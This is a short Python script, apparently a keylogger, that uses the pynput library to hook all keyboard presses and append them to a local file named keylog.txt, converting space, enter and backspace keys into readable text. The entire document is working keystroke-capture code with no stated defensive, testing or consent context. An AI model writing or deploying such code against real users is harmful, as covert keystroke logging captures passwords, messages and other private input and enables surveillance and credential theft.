from pynput.keyboard import Listener

# Function to write keystrokes to a file
def write_to_file(key):
    key = str(key)
    # Removing unnecessary quotes and adding line breaks
    key = key.replace("'", "")
    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.backspace':
        key = '[BACKSPACE]'
    with open("keylog.txt", "a") as f:
        f.write(key)

# Listener object to monitor keystrokes
with Listener(on_press=write_to_file) as listener:
    listener.join()
